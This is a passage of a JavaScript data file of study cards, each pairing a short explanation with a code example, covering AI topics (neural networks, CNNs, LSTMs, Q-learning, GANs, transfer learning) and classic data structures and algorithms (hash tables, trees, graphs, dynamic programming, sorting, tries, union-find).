    subcategory: 'Fundamentals',
    description: 'Computational models inspired by biological neurons.',
    content: 'Neural networks consist of layers of interconnected nodes (neurons). Input layer receives data, hidden layers transform it, output layer produces predictions. Each connection has a weight, each neuron applies an activation function (ReLU, sigmoid, tanh). Training adjusts weights via backpropagation and gradient descent to minimize a loss function. Hyperparameters: learning rate, batch size, epochs, layer sizes, regularization',
    example: `# Simple neural network with PyTorch
import torch
import torch.nn as nn

class NeuralNet(nn.Module):
    def __init__(self, input_size, hidden_size, output_size):
        super().__init__()
        self.network = nn.Sequential(
            nn.Linear(input_size, hidden_size),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(hidden_size, hidden_size),
            nn.ReLU(),
            nn.Linear(hidden_size, output_size)
        )

    def forward(self, x):
        return self.network(x)

model = NeuralNet(784, 256, 10)
criterion = nn.CrossEntropyLoss()
optimizer = torch.optim.Adam(model.parameters(), lr=0.001)

# Training loop
for epoch in range(10):
    for batch_x, batch_y in dataloader:
        outputs = model(batch_x)
        loss = criterion(outputs, batch_y)
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()`
  },
  {
    title: 'CNNs',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Convolutional Neural Networks for spatial data like images.',
    content: 'CNNs use convolutional layers that slide filters over input to detect features (edges, textures, objects). Key layers: Conv2d (feature extraction), Pooling (downsampling), Flatten, Dense (classification). Filters learn hierarchical features: early layers detect edges, deeper layers detect shapes/objects. architectures: LeNet, AlexNet, VGG, ResNet (skip connections), EfficientNet. Transfer learning from pretrained models is standard practice',
    example: `# CNN for image classification
import torch.nn as nn

class CNN(nn.Module):
    def __init__(self, num_classes=10):
        super().__init__()
        self.features = nn.Sequential(
            nn.Conv2d(3, 32, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.MaxPool2d(2),
            nn.Conv2d(32, 64, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.MaxPool2d(2),
            nn.Conv2d(64, 128, kernel_size=3, padding=1),
            nn.ReLU(),
            nn.AdaptiveAvgPool2d((1, 1))
        )
        self.classifier = nn.Sequential(
            nn.Flatten(),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Linear(64, num_classes)
        )

    def forward(self, x):
        x = self.features(x)
        return self.classifier(x)

# Transfer learning with pretrained model
import torchvision.models as models
model = models.resnet18(pretrained=True)
model.fc = nn.Linear(model.fc.in_features, 10)  # new classifier`
  },
  {
    title: 'RNNs & LSTMs',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Recurrent networks for sequential data with memory.',
    content: 'RNNs process sequences by maintaining hidden state — each step depends on previous steps. Standard RNNs suffer from vanishing gradients (can\'t learn long-range dependencies). LSTMs add gates (forget, input, output) to control information flow. GRUs are simplified LSTMs. Used for time series, NLP, music generation. Transformers have largely replaced RNNs for NLP, but RNNs still useful for streaming/real-time data',
    example: `# LSTM for sequence prediction
import torch.nn as nn

class LSTMModel(nn.Module):
    def __init__(self, input_size, hidden_size, num_layers, output_size):
        super().__init__()
        self.lstm = nn.LSTM(
            input_size=input_size,
            hidden_size=hidden_size,
            num_layers=num_layers,
            batch_first=True,
            dropout=0.2
        )
        self.fc = nn.Linear(hidden_size, output_size)

    def forward(self, x):
        # x shape: (batch, seq_len, features)
        lstm_out, (h_n, c_n) = self.lstm(x)
        # Use last hidden state
        last_hidden = lstm_out[:, -1, :]
        return self.fc(last_hidden)

model = LSTMModel(input_size=1, hidden_size=64, num_layers=2, output_size=1)

# Time series: predict next value
# Input: 30 days of prices → Output: day 31 price`
  },
  {
    title: 'Reinforcement Learning',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Learning optimal actions through trial and error with rewards.',
    content: 'RL learns a policy (state → action mapping) that maximizes cumulative reward. Agent interacts with environment, observes state, takes action, receives reward. Key concepts: exploration vs exploitation, discount factor (gamma), Q-value (expected return), policy gradient. Algorithms: Q-learning, DQN, PPO, A3C. Applications: game playing (AlphaGo), robotics, autonomous driving, recommendation systems',
    example: `# Simple Q-learning
import numpy as np

class QLearningAgent:
    def __init__(self, n_states, n_actions, lr=0.1, gamma=0.99, epsilon=0.1):
        self.q_table = np.zeros((n_states, n_actions))
        self.lr = lr
        self.gamma = gamma
        self.epsilon = epsilon
        self.n_actions = n_actions

    def choose_action(self, state):
        if np.random.random() < self.epsilon:
            return np.random.randint(self.n_actions)  # explore
        return np.argmax(self.q_table[state])  # exploit

    def update(self, state, action, reward, next_state, done):
        if done:
            target = reward
        else:
            target = reward + self.gamma * np.max(self.q_table[next_state])

        self.q_table[state, action] += self.lr * (target - self.q_table[state, action])

# Training loop
agent = QLearningAgent(n_states=16, n_actions=4)
for episode in range(1000):
    state = env.reset()
    total_reward = 0
    while True:
        action = agent.choose_action(state)
        next_state, reward, done, _ = env.step(action)
        agent.update(state, action, reward, next_state, done)
        state = next_state
        total_reward += reward
        if done:
            break`
  },
  {
    title: 'NLP',
    category: 'Artificial Intelligence',
    subcategory: 'Applied',
    description: 'Natural Language Processing — enabling machines to understand human language.',
    content: 'NLP combines linguistics and ML for text processing. Tasks: tokenization (split text), POS tagging, named entity recognition, sentiment analysis, text classification, machine translation, summarization, question answering. Traditional: TF-IDF, bag-of-words. Modern: word embeddings (Word2Vec, GloVe), transformer models (BERT, GPT). Pre-trained models with fine-tuning dominate modern NLP',
    example: `# NLP with Hugging Face transformers
from transformers import pipeline

# Sentiment analysis
classifier = pipeline("sentiment-analysis")
result = classifier("I love this product! It's amazing!")
print(result)  # [{'label': 'POSITIVE', 'score': 0.9998}]

# Named entity recognition
ner = pipeline("ner", grouped_entities=True)
entities = ner("Elon Musk founded SpaceX in California")
print(entities)
# [{'entity_group': 'PER', 'word': 'Elon Musk'},
#  {'entity_group': 'ORG', 'word': 'SpaceX'},
#  {'entity_group': 'LOC', 'word': 'California'}]

# Text generation
generator = pipeline("text-generation", model="gpt2")
output = generator("The future of AI is", max_length=50, num_return_sequences=3)

# Summarization
summarizer = pipeline("summarization")
summary = summarizer(long_article, max_length=150, min_length=50)`
  },
  {
    title: 'GANs',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Generative Adversarial Networks — two networks competing to generate realistic data.',
    content: 'GANs consist of a Generator (creates fake data) and Discriminator (distinguishes real from fake). They train adversarially — generator improves at fooling discriminator, discriminator improves at detecting fakes. Applications: image generation, style transfer, data augmentation, deepfakes. Training is unstable (mode collapse, vanishing gradients). Variants: DCGAN (convolutional), StyleGAN (high-quality faces), CycleGAN (unpaired translation), Pix2Pix (paired translation)',
    example: `# Simplified GAN architecture
import torch.nn as nn

class Generator(nn.Module):
    def __init__(self, latent_dim=100, img_dim=784):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(latent_dim, 256),
            nn.LeakyReLU(0.2),
            nn.Linear(256, 512),
            nn.LeakyReLU(0.2),
            nn.Linear(512, img_dim),
            nn.Tanh()
        )

    def forward(self, z):
        return self.net(z)

class Discriminator(nn.Module):
    def __init__(self, img_dim=784):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(img_dim, 512),
            nn.LeakyReLU(0.2),
            nn.Dropout(0.3),
            nn.Linear(512, 256),
            nn.LeakyReLU(0.2),
            nn.Dropout(0.3),
            nn.Linear(256, 1),
            nn.Sigmoid()
        )

    def forward(self, img):
        return self.net(img)

# Training: alternate between D and G
criterion = nn.BCELoss()
for epoch in range(epochs):
    # Train Discriminator
    real_loss = criterion(D(real_images), real_labels)
    fake_loss = criterion(D(G(noise)), fake_labels)
    d_loss = real_loss + fake_loss

    # Train Generator
    g_loss = criterion(D(G(noise)), real_labels)  # fool D`
  },
  {
    title: 'Transfer Learning',
    category: 'Artificial Intelligence',
    subcategory: 'Advanced',
    description: 'Leveraging pre-trained models to solve new but related problems.',
    content: 'Transfer learning reuses a model trained on one task for a different but related task. Benefits: less data needed, faster training, better performance. Strategies: Feature extraction (freeze base model, train new head), Fine-tuning (unfreeze some layers, low learning rate). Choose pre-trained model similar to your domain. NLP: BERT, GPT. Vision: ResNet, EfficientNet. Audio: Whisper. Always check the model\'s license for commercial use',
    example: `# Transfer learning with PyTorch
import torch
import torch.nn as nn
import torchvision.models as models

# Load pretrained ResNet
model = models.resnet50(pretrained=True)

# Freeze all layers
for param in model.parameters():
    param.requires_grad = False

# Replace classifier for your task
num_classes = 5
model.fc = nn.Sequential(
    nn.Linear(model.fc.in_features, 256),
    nn.ReLU(),
    nn.Dropout(0.3),
    nn.Linear(256, num_classes)
)

# Only train new layers
optimizer = torch.optim.Adam(
    filter(lambda p: p.requires_grad, model.parameters()),
    lr=0.001
)

# Fine-tune later: unfreeze top layers
for param in model.layer4.parameters():
    param.requires_grad = True
optimizer = torch.optim.Adam(model.parameters(), lr=0.0001)

# Hugging Face approach
from transformers import AutoModelForImageClassification
model = AutoModelForImageClassification.from_pretrained(
    "microsoft/resnet-50",
    num_labels=5,
    ignore_mismatched_sizes=True
)`
  },

  // ═══════════════════════════════════════════
  // DSA — Fundamentals
  // ═══════════════════════════════════════════
  {
    title: 'Big-O Notation',
    category: 'DSA',
    subcategory: 'Fundamentals',
    description: 'Measuring algorithm efficiency in terms of time and space complexity.',
    content: 'Big-O describes upper bound of growth rate. O(1) = constant, O(log n) = logarithmic, O(n) = linear, O(n log n) = linearithmic, O(n²) = quadratic, O(2ⁿ) = exponential, O(n!) = factorial. Always consider worst case. Drop constants and lower-order terms. Space complexity measures extra memory. Multiple variables: O(n + m). Amortized analysis (e.g., dynamic array push) averages over operations',
    example: `// O(1) — constant
function getFirst(arr) { return arr[0]; }

// O(log n) — logarithmic
function binarySearch(arr, target) {
  let lo = 0, hi = arr.length - 1;
  while (lo <= hi) {
    const mid = (lo + hi) >> 1;
    if (arr[mid] === target) return mid;
    arr[mid] < target ? lo = mid + 1 : hi = mid - 1;
  }
  return -1;
}

// O(n) — linear
function findMax(arr) {
  let max = arr[0];
  for (const val of arr) max = Math.max(max, val);
  return max;
}

// O(n²) — quadratic
function bubbleSort(arr) {
  for (let i = 0; i < arr.length; i++)
    for (let j = 0; j < arr.length - i - 1; j++)
      if (arr[j] > arr[j+1]) [arr[j], arr[j+1]] = [arr[j+1], arr[j]];
}

// O(n log n) — linearithmic (merge sort, JS sort)`
  },
  {
    title: 'Hash Tables',
    category: 'DSA',
    subcategory: 'Fundamentals',
    description: 'Key-value storage with O(1) average lookup using hash functions.',
    content: 'Hash tables map keys to values via a hash function that computes an index into an array of buckets. Collisions handled by chaining (linked lists) or open addressing (linear/quadratic probing). Load factor (n/capacity) determines when to resize. Amortized O(1) for get/set/delete. Worst case O(n) with many collisions. JavaScript Objects and Maps, Python dicts, Java HashMaps all use hash tables',
    example: `// Hash table implementation (simplified)
class HashTable {
  constructor(size = 53) {
    this.buckets = Array.from({ length: size }, () => []);
  }

  _hash(key) {
    let total = 0;
    for (let i = 0; i < key.length; i++) {
      total = (total * 31 + key.charCodeAt(i)) % this.buckets.length;
    }
    return total;
  }

  set(key, value) {
    const idx = this._hash(key);
    const bucket = this.buckets[idx];
    const existing = bucket.find(([k]) => k === key);
    if (existing) existing[1] = value;
    else bucket.push([key, value]);
  }

  get(key) {
    const bucket = this.buckets[this._hash(key)];
    const pair = bucket.find(([k]) => k === key);
    return pair ? pair[1] : undefined;
  }

  delete(key) {
    const idx = this._hash(key);
    this.buckets[idx] = this.buckets[idx].filter(([k]) => k !== key);
  }
}`
  },
  {
    title: 'Binary Search Trees',
    category: 'DSA',
    subcategory: 'Fundamentals',
    description: 'Ordered tree structure with O(log n) average operations.',
    content: 'BST property: left child < parent < right child. Enables O(log n) search, insert, delete (average). In-order traversal yields sorted order. Balanced BSTs (AVL, Red-Black) guarantee O(log n) worst case. Unbalanced BSTs degrade to linked list O(n). Used as building blocks for maps, sets, and priority queues. Self-balancing trees maintain height balance automatically',
    example: `class TreeNode {
  constructor(val) {
    this.val = val;
    this.left = null;
    this.right = null;
  }
}

class BST {
  constructor() { this.root = null; }

  insert(val) {
    const node = new TreeNode(val);
    if (!this.root) { this.root = node; return; }
    let curr = this.root;
    while (true) {
      if (val < curr.val) {
        if (!curr.left) { curr.left = node; return; }
        curr = curr.left;
      } else {
        if (!curr.right) { curr.right = node; return; }
        curr = curr.right;
      }
    }
  }

  search(val) {
    let curr = this.root;
    while (curr) {
      if (val === curr.val) return true;
      curr = val < curr.val ? curr.left : curr.right;
    }
    return false;
  }

  // In-order: left, root, right (sorted)
  inorder(node = this.root, result = []) {
    if (node) {
      this.inorder(node.left, result);
      result.push(node.val);
      this.inorder(node.right, result);
    }
    return result;
  }
}`
  },
  {
    title: 'Graph Algorithms',
    category: 'DSA',
    subcategory: 'Fundamentals',
    description: 'Traversing and analyzing networks of nodes and edges.',
    content: 'Graphs model relationships. Representations: adjacency matrix O(V²) space, adjacency list O(V+E) space. BFS explores level by level (shortest path in unweighted graphs). DFS explores depth-first (cycle detection, topological sort). Dijkstra finds shortest paths (non-negative weights). A* uses heuristics for faster search. Topological sort orders directed acyclic graphs. Connected components identify separate groups',
    example: `// Adjacency list representation
const graph = {
  A: ["B", "C"],
  B: ["A", "D", "E"],
  C: ["A", "F"],
  D: ["B"],
  E: ["B", "F"],
  F: ["C", "E"]
};

// BFS — shortest path (unweighted)
function bfs(graph, start) {
  const visited = new Set([start]);
  const queue = [start];
  const order = [];

  while (queue.length) {
    const node = queue.shift();
    order.push(node);
    for (const neighbor of graph[node]) {
      if (!visited.has(neighbor)) {
        visited.add(neighbor);
        queue.push(neighbor);
      }
    }
  }
  return order;
}

// DFS — cycle detection
function hasCycle(graph) {
  const visited = new Set();
  const recStack = new Set();

  function dfs(node) {
    visited.add(node);
    recStack.add(node);
    for (const neighbor of graph[node]) {
      if (!visited.has(neighbor)) {
        if (dfs(neighbor)) return true;
      } else if (recStack.has(neighbor)) return true;
    }
    recStack.delete(node);
    return false;
  }

  return Object.keys(graph).some(n => !visited.has(n) && dfs(n));
}`
  },
  {
    title: 'Dynamic Programming',
    category: 'DSA',
    subcategory: 'Advanced',
    description: 'Breaking complex problems into overlapping subproblems with optimal substructure.',
    content: 'DP solves problems by combining solutions to subproblems. Two approaches: Top-down (memoization — recursive with cache), Bottom-up (tabulation — iterative with table). Key properties: overlapping subproblems (same subproblems solved repeatedly), optimal substructure (optimal solution contains optimal sub-solutions). Common patterns: knapsack, longest common subsequence, edit distance, coin change, rod cutting',
    example: `// Fibonacci — memoization (top-down)
function fibMemo(n, memo = {}) {
  if (n <= 1) return n;
  if (memo[n]) return memo[n];
  memo[n] = fibMemo(n-1, memo) + fibMemo(n-2, memo);
  return memo[n];
}

// Fibonacci — tabulation (bottom-up)
function fibTab(n) {
  if (n <= 1) return n;
  const dp = [0, 1];
  for (let i = 2; i <= n; i++) {
    dp[i] = dp[i-1] + dp[i-2];
  }
  return dp[n];
}

// 0/1 Knapsack
function knapsack(weights, values, capacity) {
  const n = weights.length;
  const dp = Array.from({ length: n + 1 }, () => Array(capacity + 1).fill(0));

  for (let i = 1; i <= n; i++) {
    for (let w = 0; w <= capacity; w++) {
      dp[i][w] = dp[i-1][w]; // don't take item i
      if (weights[i-1] <= w) {
        dp[i][w] = Math.max(
          dp[i][w],
          dp[i-1][w - weights[i-1]] + values[i-1]
        );
      }
    }
  }
  return dp[n][capacity];
}`
  },
  {
    title: 'Sorting Algorithms',
    category: 'DSA',
    subcategory: 'Advanced',
    description: 'Different strategies for ordering data with varying time-space tradeoffs.',
    content: 'Comparison sorts: Bubble O(n²), Selection O(n²), Insertion O(n²) but O(n) nearly sorted. Merge sort O(n log n) stable, uses O(n) space. Quick sort O(n log n) average, O(n²) worst (mitigated by randomization). Heap sort O(n log n) in-place. Non-comparison: Counting sort O(n+k), Radix sort O(d·n). JavaScript uses TimSort (merge + insertion). Choose based on data size, constraints, and stability needs',
    example: `// Quick Sort
function quickSort(arr, lo = 0, hi = arr.length - 1) {
  if (lo < hi) {
    const pivot = arr[hi];
    let i = lo - 1;
    for (let j = lo; j < hi; j++) {
      if (arr[j] <= pivot) {
        i++;
        [arr[i], arr[j]] = [arr[j], arr[i]];
      }
    }
    [arr[i + 1], arr[hi]] = [arr[hi], arr[i + 1]];
    const pivotIdx = i + 1;
    quickSort(arr, lo, pivotIdx - 1);
    quickSort(arr, pivotIdx + 1, hi);
  }
  return arr;
}

// Merge Sort
function mergeSort(arr) {
  if (arr.length <= 1) return arr;
  const mid = arr.length >> 1;
  const left = mergeSort(arr.slice(0, mid));
  const right = mergeSort(arr.slice(mid));
  return merge(left, right);
}

function merge(left, right) {
  const result = [];
  let i = 0, j = 0;
  while (i < left.length && j < right.length) {
    result.push(left[i] <= right[j] ? left[i++] : right[j++]);
  }
  return result.concat(left.slice(i), right.slice(j));
}

// Counting Sort (non-comparison)
function countingSort(arr) {
  const max = Math.max(...arr);
  const count = Array(max + 1).fill(0);
  for (const num of arr) count[num]++;
  const sorted = [];
  for (let i = 0; i < count.length; i++) {
    while (count[i]-- > 0) sorted.push(i);
  }
  return sorted;
}`
  },
  {
    title: 'Trie',
    category: 'DSA',
    subcategory: 'Advanced',
    description: 'Prefix tree for efficient string storage and retrieval.',
    content: 'A Trie stores strings character-by-character in a tree. Each node represents a character, paths form words. Common prefix = shared path. Operations: insert O(m), search O(m), startsWith O(m) where m = word length. Used for autocomplete, spell checking, IP routing, word games. Space-efficient for shared prefixes. Can be augmented with frequency counts for ranking suggestions',
    example: `class TrieNode {
  constructor() {
    this.children = {};
    this.isEnd = false;
  }
}

class Trie {
  constructor() { this.root = new TrieNode(); }

  insert(word) {
    let node = this.root;
    for (const char of word) {
      if (!node.children[char]) {
        node.children[char] = new TrieNode();
      }
      node = node.children[char];
    }
    node.isEnd = true;
  }

  search(word) {
    let node = this.root;
    for (const char of word) {
      if (!node.children[char]) return false;
      node = node.children[char];
    }
    return node.isEnd;
  }

  startsWith(prefix) {
    let node = this.root;
    for (const char of prefix) {
      if (!node.children[char]) return false;
      node = node.children[char];
    }
    return true;
  }
}

// Usage
const trie = new Trie();
trie.insert("apple");
trie.insert("app");
trie.search("apple");    // true
trie.search("app");      // true
trie.startsWith("ap");   // true
trie.search("apl");      // false`
  },
  {
    title: 'Union-Find',
    category: 'DSA',
    subcategory: 'Advanced',
    description: 'Disjoint set data structure for tracking connected components.',
    content: 'Union-Find (Disjoint Set Union) manages partitions of elements into disjoint sets. Two operations: Find (which set does element belong to?), Union (merge two sets). Optimizations: Path compression (flatten tree during find), Union by rank (attach smaller tree to larger). With both optimizations, amortized O(α(n)) ≈ O(1) per operation. Used in Kruskal\'s MST, cycle detection, connected components, social network analysis',
    example: `class UnionFind {
  constructor(n) {
    this.parent = Array.from({ length: n }, (_, i) => i);
    this.rank = Array(n).fill(0);
    this.components = n;
  }

  find(x) {
    if (this.parent[x] !== x) {
      this.parent[x] = this.find(this.parent[x]); // path compression
    }
    return this.parent[x];
  }

  union(x, y) {
    const px = this.find(x);
    const py = this.find(y);
    if (px === py) return false; // already connected

    // Union by rank
    if (this.rank[px] < this.rank[py]) {
      this.parent[px] = py;
    } else if (this.rank[px] > this.rank[py]) {
      this.parent[py] = px;
    } else {
      this.parent[py] = px;
      this.rank[px]++;
    }
    this.components--;
    return true;
  }

  connected(x, y) {
    return this.find(x) === this.find(y);
  }
}

// Kruskal's MST
function kruskal(n, edges) {
  edges.sort((a, b) => a[2] - b[2]); // sort by weight
  const uf = new UnionFind(n);
  const mst = [];

  for (const [u, v, weight] of edges) {
    if (uf.union(u, v)) {
      mst.push([u, v, weight]);
      if (mst.length === n - 1) break;
    }
  }
  return mst;
}`
  },
];
